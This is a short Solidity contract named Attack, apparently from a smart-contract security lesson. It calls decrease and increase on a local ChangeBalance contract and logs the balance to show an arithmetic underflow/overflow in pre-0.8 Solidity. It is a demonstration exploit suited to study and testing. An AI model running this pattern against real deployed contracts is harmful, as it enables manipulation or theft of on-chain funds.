pragma solidity 0.7.0;

import 'hardhat/console.sol';
import './ChangeBalance.sol';

contract Attack {
    ChangeBalance public changeBalance;

    constructor(address _changeBalanceAddress) {
        changeBalance = ChangeBalance(_changeBalanceAddress);
    }

    function attack() public {
        changeBalance.decrease();
        console.log("After Decrease:", changeBalance.getBalance());
        changeBalance.increase();
        console.log("After Increase:", changeBalance.getBalance());
        changeBalance.increase();
        console.log("After Increase:", changeBalance.getBalance());
    }
}